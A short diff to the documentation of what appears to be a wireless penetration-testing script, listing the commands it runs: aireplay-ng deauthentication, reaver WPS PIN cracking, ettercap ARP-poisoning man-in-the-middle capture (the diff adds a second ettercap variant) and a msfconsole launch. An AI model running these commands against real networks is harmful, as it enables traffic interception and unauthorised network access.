@@ -84,9 +84,11 @@ aireplay-ng -0 $deauthvar -a $bssidvar wlan0mon
 
 reaver -i wlan0mon -b $bssidvar -vv -S -P -c $chanvar -d $delvar -o /root/wpslog/wpscrack/$filevar.log
 
-4. 'MITM-Ettercap' will intiate a MITM by Ettercap. The command line used is as follows:
+4. 'MITM-Ettercap' will intiate a MITM by Ettercap. The command line used has two options:
 
 ettercap -T -i $intervar -M arp:remote -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
+
+ettercap -T -i $intervar -M ARP -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
 
 6. 'Metasploit' will fire up good old msfconsole for you to employ further at your hearts' content
 
